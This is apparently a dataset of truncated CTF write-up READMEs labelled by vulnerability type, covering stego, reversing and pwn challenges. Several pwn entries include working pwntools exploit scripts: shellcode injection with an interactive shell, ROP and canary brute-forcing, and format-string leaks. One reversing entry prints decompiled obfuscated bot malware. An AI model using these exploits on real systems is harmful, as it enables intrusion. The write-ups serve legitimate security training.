ctf_writeup,writeups-66,writeups,Backdoor-CTF/stego/loseless/abishek/README.md,abishek,other,"***LOSELESS*** *category:steganography* *points:100* In this challenge, we are provided with two images, `original.png` and `encrypted.png`. And are supposed to find the hidden message. Observing the images and seeing the difference using `compare original.png encrypted.png diff.png` reveals that both the images differ only in the top right corner. ![bump](files/diff.png) It was only a matter of seconds that we realized these may be binary strings Blue - 1 and Black - 0. Moreover, they were of 7 bits (Vertically). That further provoked the thought of them fitting in ASCII representation. (<128) We wrote a quick script to read the binary numbers and got the output `The flag is SHA256{-----------------------------}`. TEAM BYTEBANDITS"
ctf_writeup,writeups-67,writeups,tu-ctf-2018/pwn/timber/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=rop) [](tools=radare2,gdb-peda,pwntools,python) # Timber We are given a [binary](../timber) with a stack canary, a stack based buffer overflow and a format string vulnerability. The binary mimics the popular dating application Tinder! ```bash vagrant@amy:~/share/timber$ file timber timber: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5f25b2cc724fad9767439392ba05ac91177ae3ee, not stripped ``` ```bash vagrant@amy:~/share/timber$ ./timber Welcome to Timber™! The world's largest lumberjack dating site Please enter your name: jack Alright jack Let's find you a match! Options: l: Swipe Left r: Swipe Right s: Super Swipe Eastern Pine age 4183? l American Elm age 502? r American Beech age 796? s +Match Found! ----------------- American Beech ---------------- [American Beech] So, are you a tree hugger or what. hello [American Beech] Pff, lumberjacks are all the same. ``` The format string vulnerability can be used to leak the stack canary allowing us to exploit the binary with a ROP chain. ```python from pwn import * context(arch='i386', os='linux') #"
ctf_writeup,writeups-68,writeups,tu-ctf-2018/pwn/lisa/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=rop) [](tools=radare2,gdb-peda,pwntools,python) # Lisa We are given a [binary](../lisa) which leaks a heap address and has a stack based buffer overflow allowing us to overwrite at most 1 byte of the saved return address. ```bash vagrant@amy:~/share/lisa$ file lisa lisa: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7f2cd300a5518deec5cb00e27dae466022fdacd9, not stripped ``` `PIE` and `NX` enabled. ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : ENABLED RELRO : Partial ``` With these constraints, we can jump to the following locations: ```assembly ... │ 0x00000d01 8d8340000000 lea eax, [ebx + 0x40] ; ""4"" ; '@' │ 0x00000d07 8b10 mov edx, dword [eax] │ 0x00000d09 8d8348000000 lea eax, [ebx + 0x48] ; 'H' │ 0x00000d0f 8b00 mov eax, dword [eax] │ 0x00000d11 6a2b push 0x2b ; '+' ; size_t nbyte │ 0x00000d13 52 push edx ; void *buf │ 0x00000d14 50 push eax ; int fildes │ 0x00000d15 e836f8ffff call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte) │ 0x00000d1a 83c40c add esp, 0xc │ 0x00000d1d e89cfaff"
ctf_writeup,writeups-69,writeups,tu-ctf-2018/pwn/ehh/jaiverma/README.md,jaiverma,format_string,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-canary) [](tools=radare2,gdb-peda,pwntools,python) # Ehh We are given a [binary](../ehh) which prints out the address of a variable and accepts user input. ```bash vagrant@amy:~/share/ehh$ file ehh ehh: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d50965fb2cafc7eb26ecbce94385e870a05d02eb, not stripped ``` The binary has a format string vulnerability which can be leveraged to overwrite the variable such that the constaint is satisfied. ```assembly ... │ 0x000006f6 8b8328000000 mov eax, dword [ebx + 0x28] ; [0x28:4]=0x200034 ; '(' │ 0x000006fc 83f818 cmp eax, 0x18 │ ┌─< 0x000006ff 7512 jne 0x713 │ │ 0x00000701 83ec0c sub esp, 0xc │ │ 0x00000704 8d83d2e7ffff lea eax, [ebx - 0x182e] │ │ 0x0000070a 50 push eax ; const char *string │ │ 0x0000070b e8b0fdffff call sym.imp.system ; int system(const char *string) │ │ 0x00000710 83c410 add esp, 0x10 │ └─> 0x00000713 b800000000 mov eax, 0 ... ``` Exploit: ```python from pwn import * context(arch='i386', os='linux') # p = process('./ehh') p = remote('18.222.213.102', 12345) p.recvuntil('here< ') "
ctf_writeup,writeups-70,writeups,tu-ctf-2018/pwn/shella-easy/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=buffer-overflow) [](tools=radare2,gdb-peda,pwntools,python) # Shella Easy We are given a [binary](../shella-easy) without any exploit mitigations. ```bash vagrant@amy:~/share/shella_easy$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped ``` ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial ``` The program has a call to `gets` and thus is a vanilla stack based buffer overflow. Exploitation allows us to get the flag from the server. ```python from pwn import * context(arch='i386', os='linux') # p = process('./shella') p = remote('52.15.182.55', 12345) p.recvuntil(""Yeah I'll have a "") leak = p.recvuntil(' ').strip() leak = int(leak, 16) shellcode = asm(shellcraft.i386.sh()) shellcode = shellcode.ljust(64, '\x90') shellcode += p32(0xdeadbeef) shellcode += 'a' * 8 shellcode += p32(leak) p.send(shellcode) p.interactive() ``` Flag > TUCTF{1_607_4_fl46_bu7_n0_fr135}"
ctf_writeup,writeups-71,writeups,tu-ctf-2018/pwn/canary/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-canary) [](tools=radare2,gdb-peda,pwntools,python) # canary We are given a [binary](../canary) which accepts user input and has a custom stack canary implementation. ```assembly [0x0804860b]> pdf @sym.initCanary ┌ (fcn) sym.initCanary 87 │ sym.initCanary (void *s); │ ; arg void *s @ ebp+0x8 │ ; CALL XREF from sym.doCanary (0x80486e9) │ 0x0804860b 55 push ebp │ 0x0804860c 89e5 mov ebp, esp │ 0x0804860e 6a28 push 0x28 ; '(' ; 40 ; size_t n │ 0x08048610 6a00 push 0 ; int c │ 0x08048612 ff7508 push dword [s] ; void *s │ 0x08048615 e8d6feffff call sym.imp.memset ; void *memset(void *s, int c, size_t n) │ 0x0804861a 83c40c add esp, 0xc │ 0x0804861d 8b4508 mov eax, dword [s] ; [0x8:4]=-1 ; 8 │ 0x08048620 8d5028 lea edx, [eax + 0x28] ; '(' ; 40 │ 0x08048623 a140a00408 mov eax, dword obj.devrand ; [0x804a040:4]=-1 │ 0x08048628 6a04 push 4 ; 4 ; size_t nbyte │ 0x0804862a 52 push edx ; void *buf │ 0x0804862b 50 push eax ; int fildes │ 0x0804862c e81ffeffff call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte) │ 0x08048631 83c40c add esp, 0xc │ 0x08048634 8b156ca00408 mov edx, dword [obj.nextind] ; [0x804a06c:4]=0 │ 0x0804863a 8b45"
ctf_writeup,writeups-72,writeups,tu-ctf-2018/pwn/shella-hard/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=tu-ctf-2018) [](type=pwn) [](tags=stack-pivot,buffer-overflow,rop) [](tools=radare2,gdb-peda,pwntools,python) # Shella Hard We are given a [binary](../shella-hard) with `NX` enabled and a stack based buffer overflow. ```bash vagrant@amy:~/share/shella_hard$ file shella-hard shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped ``` ```bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` The binary has `execve` in the binary's GOT which allows us to easily create a ROP chain to get a shell. ```bash vagrant@amy:~/share/shella_hard$ objdump -R shella-hard shella-hard: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__ 0804a00c R_386_JUMP_SLOT read@GLIBC_2.0 0804a010 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 0804a014 R_386_JUMP_SLOT execve@GLIBC_2.0 ``` The initial read is too small for a ROP chain and therefore we have to retun to `read` and write our ROP chain using a stack pivot. Any 'rw-' section of the bin"
ctf_writeup,writeups-73,writeups,tu-ctf-2018/reverse/yeahright/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=malloc,memcpy) [](tools=radare2,gdb-peda) # yeahright We are given a [binary](../yeahright) which accepts user input and does a memcmp with a string. ```bash vagrant@amy:~/share/yeahright$ file yeahright yeahright: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0b6d0cc001d9c9c8fb8e1e61f8b082bcda503669, not stripped ``` ```assembly gdb-peda$ c Continuing. *Ahem*... password? aaaa [----------------------------------registers-----------------------------------] RAX: 0x555555756010 --> 0xa61616161 ('aaaa\n') RBX: 0x0 RCX: 0x555555554a98 (""7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w"") RDX: 0x28 ('(') RSI: 0x555555554a98 (""7h3_m057_53cr37357_p455w0rd_y0u_3v3r_54w"") RDI: 0x555555756010 --> 0xa61616161 ('aaaa\n') RBP: 0x7fffffffe0f0 --> 0x555555554a10 (<__libc_csu_init>: push r15) RSP: 0x7fffffffe0e0 --> 0x7fffffffe1d0 --> 0x1 RIP: 0x5555555549cf (<main+143>: call 0x5555555547c0 <memcmp@plt>) R8 : 0x7ffff7fec700 (0x00007ffff7fec700) R9 : 0x14 R10: 0x37b R11: 0x246 R12: 0x555555554810 (<_start>: xor ebp,ebp) R13: 0x7fffffffe1d0 --> 0x1 R14: 0x"
ctf_writeup,writeups-74,writeups,tu-ctf-2018/reverse/danger-zone/jaiverma/README.md,jaiverma,other,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=python,pyc) [](tools=uncompyle6,python) # Danger Zone We are given a python bytecode [file](../dangerzone.pyc). We can decompile it with **uncompyle6**. ```bash vagrant@amy:~/share/Danger Zone$ uncompyle6 dangerzone.pyc # uncompyle6 version 3.2.4 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.10 (default, Oct 6 2017, 22:29:07) # [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] # Embedded file name: ./dangerzone.py # Compiled at: 2018-11-22 12:44:11 import base64 def reverse(s): return s[::-1] def b32decode(s): return base64.b32decode(s) def reversePigLatin(s): return s[-1] + s[:-1] def rot13(s): return s.decode('rot13') def main(): print 'Something Something Danger Zone' return '=YR2XYRGQJ6KWZENQZXGTQFGZ3XCXZUM33UOEIBJ' if __name__ == '__main__': s = main() print s # okay decompiling dangerzone.pyc ``` The flag can be found by calling each of these functions successively after `main`. ```python import dangerzone as dz s = dz.main() s = dz.reverse(s) s = dz.b32decode(s) s = dz.reversePigLatin(s) s = dz.rot13(s) print s ``` ```bash vagrant@amy:~/share/Danger Zone$ python exploit.py Something Something Danger Zone TUC"
ctf_writeup,writeups-75,writeups,tu-ctf-2018/reverse/shoop/jaiverma/README.md,jaiverma,format_string,"[](ctf=tu-ctf-2018) [](type=reversing) [](tags=malloc,memcpy) [](tools=radare2,gdb-peda) # Shoop We are given a [binary](../shoop) which accepts user input and validates it before printing the flag. ```bash vagrant@amy:~/share/shoop$ file shoop shoop: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2569da7d2c1014488a9a5fad953f7e6d1791125e, not stripped ``` The disassembly can be viewed using a disassembler like `radare2`. ```assembly [0x00000990]> pdf ┌ (fcn) main 518 ... │ ┌─< 0x00000a4b eb29 jmp 0xa76 │ │ ; CODE XREF from main (0xa7a) │ ┌──> 0x00000a4d 8b45f0 mov eax, dword [nbyte] │ ╎│ 0x00000a50 2b45fc sub eax, dword [local_4h] │ ╎│ 0x00000a53 4898 cdqe │ ╎│ 0x00000a55 488d50ff lea rdx, [rax - 1] │ ╎│ 0x00000a59 488b45e0 mov rax, qword [s2] │ ╎│ 0x00000a5d 4801c2 add rdx, rax ; '#' │ ╎│ 0x00000a60 8b45fc mov eax, dword [local_4h] │ ╎│ 0x00000a63 4863c8 movsxd rcx, eax │ ╎│ 0x00000a66 488b45e8 mov rax, qword [buf] │ ╎│ 0x00000a6a 4801c8 add rax, rcx ; '&' │ ╎│ 0x00000a6d 0fb600 movzx eax, byte [rax] │ ╎│ 0x00000a70 8802 mov byte [rdx], al │ ╎│ 0x00000a72 836dfc01 sub dword [l"
ctf_writeup,writeups-76,writeups,tu-ctf-2016/pwn/bby-s-first-elf/kumar_abd/README.md,kumar_abd,buffer_overflow,"**BBY'S FIRST ELF** *category*:pwn *points*:25 This is a basic Buffer overflow problem. The first step checking the file type, we get a 32-bit, non-stripped Binary file. ```bash hulkbuster@Jarvis:~/Downloads$ file 3d726802521a9ce2b24e2c3baf039915e48ad056 3d726802521a9ce2b24e2c3baf039915e48ad056: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped``` ``` We first debug the binary using GDB debugger. When overflowed look for EBP and ESP to determine the stack size. We then checked for raw symbols of this object file. It is found a function ""print_flag"" with a memory address 0x0804856d. ```bash hulkbuster@Jarvis:~/Downloads$ nm 3d726802521a9ce2b24e2c3baf039915e48ad056 0804a034 B __bss_start 0804a044 b completed.6591 0804a02c D __data_start 0804a02c W data_start 080484b0 deregister_tm_clones 08048520 t __do_global_dtors_aux 08049f0c t __do_global_dtors_aux_fini_array_entry 0804a030 __dso_handle 08049f14 d _DYNAMIC 0804a034 D _edata 0804a048 B _end U fclose@@GLIBC_2.1 U fflush@@GLIBC_2.0 fgets@@GLIBC_2.0 08048684 T _fini U fopen@@GLIBC_2.1 08048698 R _f"
ctf_writeup,writeups-77,writeups,tu-ctf-2016/pwn/especiallygoodjmps/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=tu-ctf-2016) [](type=exploit) [](tags=buffer overflow) [](tools=libc-database) [](techniques=ret2libc) # EspeciallyGoodJmps (pwn-75) ### Description >Pop a shell. >Binary is hosted at: 130.211.202.98:7575 >EDIT: >ASLR is enabled on remote server. ```bash $ file 23e4f31a5a8801a554e1066e26eb34745786f4c4 23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped ``` ```bash $ checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4 RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 23e4f31a5a8801a554e1066e26eb34745786f4c4 ``` Running the program in gdb shows that basic buffer overflow is there. ```bash gdb-peda$ r Starting program: /tmp/23e4f31a5a8801a554e1066e26eb34745786f4c4 What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA What's your favorite number? 1 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, 1 is an odd number! Program received signal "
ctf_writeup,writeups-78,writeups,tu-ctf-2016/reverse/rev50/README.md,rev50,command_injection,"***REV 50*** *category:reverse engineering* *points:50* If we analyse the given binary file we find that it is a 32-bit LSB executable. ```bash hulkbuster@Jarvis:~/Downloads$ file e7453ba07805c6bab5a0b95f57aaeb6e70af76b1 e7453ba07805c6bab5a0b95f57aaeb6e70af76b1: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=1d5c00adcd4cbb883fea12bc860f827d023e416f, not stripped ``` Open with IDA pro. If we read the program flow starting from the main function,we arrive at point where after reading we understand that it is a XOR'ing of characters with the address **0x37**. ![bump](files/binary_ida.png) open python shell and the XOR to get the flag. ![bump](files/screen.png) TEAM BYTEBANDITS"
ctf_writeup,writeups-79,writeups,csaw-finals-2019/pwn/pwn200/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-finals-2019) [](type=reverse) [](tags=ida,brtueforce) [](tools=ida) # pwn 200 Description ``` Hello, fresh recruit. nc pwn.chal.csaw.io 1003 ``` Binary is small, x64, c++ compiled with very little features. It lets you input a buffer which can be copied to a stack buffer or compared to it. The write is not limited to size, so its very easy to overflow the stack buffer. But canaries are present on the stack. We can use the compare feature to brute force canary byte by byte. Binary has PIE enabled too, we can leak base or libc addresses too from the stack using the same technique. This will help us craft a ROP with one_gadget to achieve RCE. ```python # -*- coding: UTF-8 -*- from pwn import * context.arch = ""amd64"" # context.binary = ""/tmp/csaw/a.out"" # context.log_level = ""debug"" p = process( ""/tmp/host/csaw/a.out"", env={ ""LD_PRELOAD"": ""/tmp/host/csaw/libc-2.27.so""}) raw_input() # p = remote(""pwn.chal.csaw.io"", 1003) # g = gdb.attach(p, ""canary\n context\n vmmap\n continue"") def copy(s): p.sendline(str(2)) p.sendline(str(len(s))) p.sendline(s) def check(s): p.sendline(str(1)) p.sendline(str(len(s))) p.sendline(s) return ""found"" in p.recvline() bf = ""A"" * 9 copy(bf) """""" 0"
ctf_writeup,writeups-80,writeups,csaw-finals-2019/reverse/re200/sudhackar/README.md,sudhackar,rop,"[](ctf=csaw-finals-2019) [](type=reverse) [](tags=ida) [](tools=ida) # counting (re-200) [Binary](../counting) The flag was referenced in different functions to check one byte each. IDA xrefs did not work properly. So we just grep over the disassembly to find all 30 bytes in the flag. ```python from idautils import * from idaapi import * from idc import * from sark import * flag = [32 for i in xrange(32)] for segea in Segments(): for funcea in Functions(segea, SegEnd(segea)): functionName = GetFunctionName(funcea) print functionName f = Function(funcea) last_idx = 0 for line in f.lines: if ""cs:flag"" in line.disasm: if ""+"" in line.disasm: last_idx = int(line.disasm.split(""+"")[1].replace(""h"", """"), 16) elif ""sub cl"" in line.disasm: try: print last_idx b = int(line.disasm.split("","")[1].replace(""h"", """"), 16) flag[last_idx] = b except: pass for i, j in enumerate(""flag{""): flag[i] = ord(j) flag[30] = ord(""}"") print """".join(map(chr,flag)) ```"
ctf_writeup,writeups-81,writeups,ekoparty-ctf-2015/reversing/Patch me/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-ctf-2015) [](type=reversing) [](tags=image,C#) [](tools=Telerik-JustDecompile,PIL) [](techniques=no-patch) # Patch me (rev50) We have a [zip](../rev50.zip). Extract and we get ```bash $ file * SecureImageViewer.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows secureimage.xml: XML document text ``` .Net assembly can be very easy decompiled. I use [Telerik JustDecompile](http://www.telerik.com/products/decompiler.aspx) to decompile the code. Here is the code that does the main job of decoding the xml to an image. ```cs protected void open(object sender, EventArgs e) { int num = 201527; int[] numArray = new int[100001]; int num1 = 0; using (FileStream fileStream = File.OpenRead(""secureimage.xml"")) { numArray = (int[])(new XmlSerializer(typeof(int[]))).Deserialize(fileStream); } for (int i = 0; i < 100000; i++) { num1 = num1 + numArray[i]; } if (num1 != numArray[100000]) { MessageDialog messageDialog = new MessageDialog(null, 1, 3, 1, ""Corrupted Image"", new object[0]); messageDialog.Run(); messageDialog.Destroy(); return; } GC gC = new GC(this.graph.get_GdkWindow()); gC.set_RgbFgColor(new Color(51, 102, 153)); this.graph.get_GdkWindow().GetImage"
ctf_writeup,writeups-82,writeups,ekoparty-ctf-2015/reversing/Malware/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-ctf-2015) [](type=reversing) [](tags=malware,control,pickle,RSA) [](tools=Twitter,easy-python-decompiler) [](techniques=Decompiling) # Malware (rev-200) We have a [zip](../rev200.zip). Extract and we get ```bash $ file ekobot_final.pyc ekobot_final.pyc: python 2.7 byte-compiled ``` Byte-compiled python can be very easily decompiled. So here I use [Easy Python Decompiler](http://sourceforge.net/projects/easypythondecompiler/). We get an [output](ekobot_final.py) which is scary! ```python # Embedded file name: ekobot_final.py import os import sys import httplib2 import cPickle from Crypto.PublicKey import RSA from base64 import b64decode from twython import Twython if 0: i11iIiiIii OO0o = 'ekoctf' if 0: Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o if len(sys.argv) != 2: os._exit(0) if 0: IiII1IiiIiI1 / iIiiiI1IiI1I1 o0OoOoOO00 = sys.argv[1] if 0: OOOo0 / Oo - Ooo00oOo00o.I1IiI o0OOO = 'ienmDwTNHZVR9si4SzeCg1glB' iIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN' if 0: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI def o0oO0(): oo00 = 0 if os.path.isfile(o0OoOoOO00): try: o00 = open(o0OoOoOO00, 'r') oo00 = int(o00.readline("
ctf_writeup,writeups-83,writeups,csaw-finals-2021/reverse/control/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-finals-2021) [](type=reverse) [](tags=ida) [](tools=ida,pin,gdb) # control (re) ```sh [csaw] file control control.bin control: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4276a8d2c0e4c4a4e0e444f7f10d3f4b2c2b0409, for GNU/Linux 3.2.0, stripped control.bin: data ``` 2 files were provided. ELF was about 15K in size and the bin file was about 21K. The ELF is not obfuscated and easily decompiles in IDA to a very simple C code. The binary has implemented a custom VM and control.bin is the bytecode. `main` function loads the bytecode and has the vm evaluation loop. ```c while ( op >= 0 ) { op = ptr[vip]; if ( (op & 0x40000) != 0 ) c = r6 + r7; if ( (op & 0x80000) != 0 ) c = r6 * r7; if ( (op & 0x20000) != 0 ) { if ( r7 <= 0 ) v3 = r6 << -(char)r7; else v3 = (unsigned int)r6 >> r7; c = v3; } if ( (op & 0x100000) != 0 ) c = r6 ^ r7; if ( (op & 0x200000) != 0 ) c = r6 == r7; if ( (op & 4) != 0 ) ridx = r1; if ( (op & 0x20) != 0 ) ridx = r2; if ( (op & 0x100) != 0 ) ridx = r3; if ( (op & 0x800) != 0 ) ridx = r4; if ( (op & 0x4000) != 0 ) ridx = r5; if ( (op & 2) != 0 ) c = r1; if ( (op & 0x10) !"
ctf_writeup,writeups-84,writeups,csaw-finals-2021/reverse/maze/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-finals-2021) [](type=reverse) [](tags=ida) [](tools=ida) # maze (re) ```sh [csaw2021-fin] file maze_public maze_public: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped ``` maze is a simple ELF file without any tricks. A simple `start` to read flag, check and return ```c sys_write(1u, buf, 0x1AuLL); sys_read(0, input, 0x64uLL); x = sub_403EB6(input); // use r15 as return if (x == 0x40){ v2 = sys_write(1u, aWellDonePlease, 0x3BuLL); } else { v2 = sys_write(1u, aTryAgain, 0xCuLL); } sys_exit(1); ``` `sub_403EB6` is a simple function too. Only thing is `.text` is mapped `rwx` and this function patches entry to ret `c3` on return such that any next call is a no-op and ret. The logic is pretty straightforward too. ![node](node.png) It reads the first byte from the flag and considers it as a digit. If the digit is in 1-8 range then a tuple of values is set and used to calculate a jump. Looking at the destination of the jump we find that there are multiple copies of the same `sub_403EB6` with the same code. So the binary is basically and array of same check functions that continue jumping to each other and return if you call the same function tw"
ctf_writeup,writeups-85,writeups,csaw-finals-2018/reverse/1nsayne/sudhackar/README.md,sudhackar,format_string,"[](ctf=csaw-finals-2018) [](type=reverse) [](tags=fibonacci) [](tools=radare2,r2) # 1nsayne (rev-250) We are given a [binary](../1nsayne). ```sh $ file 1nsayne 1nsayne: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped ``` On running it waits for some input. Input is later compared with so0per_cool. ```sh $ ltrace -fbi ./1nsayne [pid 25528] [0x400890] setvbuf(0x7f3ac22df760, 0, 2, 0) = 0 [pid 25528] [0x4038b5] fgets(lol ""lol\n"", 99, 0x7f3ac22dea00) = 0x6042a0 [pid 25528] [0x4038c7] strchr(""lol\n"", '\n') = ""\n"" [pid 25528] [0x4036cb] strcmp(""lol"", ""so0per_cool"") = -7 [pid 25528] [0xffffffffffffffff] +++ exited (status 0) +++ ``` Simply passing so0per_cool as input starts printing some message. ```sh $ ltrace -fbi ./1nsayne [pid 26640] [0x400890] setvbuf(0x7f70174cb760, 0, 2, 0) = 0 [pid 26640] [0x4038b5] fgets(so0per_cool ""so0per_cool\n"", 99, 0x7f70174caa00) = 0x6042a0 [pid 26640] [0x4038c7] strchr(""so0per_cool\n"", '\n') = ""\n"" [pid 26640] [0x4036cb] strcmp(""so0per_cool"", ""so0per_cool"") = 0 [pid 26640] [0x403119] strlen(""so0per_cool"") = 11 [pid 26640] [0x403119] strlen(""so0per_cool"") = 11 ["
ctf_writeup,writeups-86,writeups,bostonkeyparty-2016/reverse/Alewife/sudhackar/README.md,sudhackar,command_injection,"[](ctf=internetwasche-ctf-2016) [](type=reverse) [](tags=prime,fraction,fractran,math) [](tools=hopper,gdb) [](techniques=) # Alewife reverse-5 We are given ```bash $ file 05223a3cae8b71d81592d5977fb1c3622bcbf793 05223a3cae8b71d81592d5977fb1c3622bcbf793: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a4d814d0167c1c0732e8fdf0e25c368c61d6b27d, not stripped ``` I throw it at hopper. Since it is not stripped it gets easily decompiled with all its variable names to [this](05223a3cae8b71d81592d5977fb1c3622bcbf793.c). ```c int primes[0xAB] = {2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643,"
ctf_writeup,writeups-87,writeups,internetwache-ctf-2016/code/a-numbers-game-2/chaitan94/README.md,chaitan94,other,"[](ctf=internetwasche-ctf-2016) [](type=code) [](tags=bot,crypto,math) [](tools=sympy) [](techniques=) # A Numbers Game II (code-70) > Math is used in cryptography, but someone got this wrong. Can you still solve the equations? Hint: You need to encode your answers. We are given the following information in a flag: > This snippet may help: > > ```python > def encode(self, eq): > out = [] > for c in eq: > q = bin(self._xor(ord(c),(2<<4))).lstrip(""0b"") > q = ""0"" * ((2<<2)-len(q)) + q > out.append(q) > b = ''.join(out) > pr = [] > for x in range(0,len(b),2): > c = chr(int(b[x:x+2],2)+51) > pr.append(c) > s = '.'.join(pr) > return s > ``` Now we have a service running on 188.166.133.53:11071, which gives messages like this > Hi, I like math and cryptography. Can you talk to me?! > Level 1.: 4.4.5.3.3.3.3.3.3.3.6.4.3.3.3.3.3.4.3.4.3.4.3.3.3.3.3.3.3.4.6.4.3.3.3.3.3.3.6.4.3.4.4.5 Obviously, to be able to reply, we need to be able to understand the encoded message. We need to write a decoding function before we can proceed further. So, let's do that. The given encoding function does the following things to encode a string: 1. Consider the string as a byte-stream and XOR with 32 for each by"
ctf_writeup,writeups-88,writeups,internetwache-ctf-2016/exploit/remote-printer/sudhackar/README.md,sudhackar,format_string,"[](ctf=internetwasche-ctf-2016) [](type=exploit) [](tags=format string) [](tools=libformatstr) [](techniques=format string) # Remote Printer (exp-80) >Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task. >Attachment: exp80.zip >Service: 188.166.133.53:12377 Unzipping the [file](../exp80.zip) gives us the following. ```bash $ file RemotePrinter RemotePrinter: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3db29aea1dc4af0eb3f7104e529f856256a1d775, stripped ``` If we run it with ```bash $ nc -l -p 8000 -vv ``` in another terminal. ```bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000 ``` gives us a connection on the listening port. ```bash $ nc -l -p 8000 -vv listening on [any] 8000 ... connect to [127.0.0.1] from Hack-Machine [127.0.0.1] 38908 %p.%p.%p sent 9, rcvd 0 ``` ```bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000 Thank you, I'm trying to print 127.0.0.1:8000 now! 0xffc8425c.0x2000.(nil) ``` So yeah! Format st"
